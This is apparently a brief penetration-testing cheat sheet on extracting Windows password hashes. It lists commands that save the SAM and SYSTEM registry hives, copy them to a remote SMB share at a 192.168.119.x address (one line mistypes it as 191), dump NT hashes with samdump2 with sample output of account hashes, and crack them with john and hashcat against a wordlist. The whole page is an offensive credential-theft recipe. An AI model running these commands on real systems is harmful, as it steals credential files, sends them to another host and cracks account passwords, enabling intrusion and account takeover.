# Windows - SAM hash

Copy the SAM and SYSTEM files.

{% code overflow="wrap" %}
```bash
reg save hklm\sam c:\sam
reg save hklm\system c:\system
copy sam \\191.168.119.128\alice
copy system \\192.168.119.128\alice   
```
{% endcode %}

Dump the SAM hash values.

```bash
samdump2 system sam > NTHash.txt
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a8c8b7a37513b7eb9308952b814b522b:::
*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* HelpAssistant:1000:05fa67eaec4d789ec4bd52f48e5a6b28:2733cdb0d8a1fec3f976f3b8ad1deeef:::
*disabled* SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:0f7a50dd4b95cec4c1dea566f820f4e7:::
alice:1004:aad3b435b51404eeaad3b435b51404ee:b74242f37e47371aff835a6ebcac4ffe:::
```

Crack NThash.txt

```
john --format=NT nthash.txt
hashcat -m 1000 nthash.txt /usr/share/wordlists/rockyou.txt
```
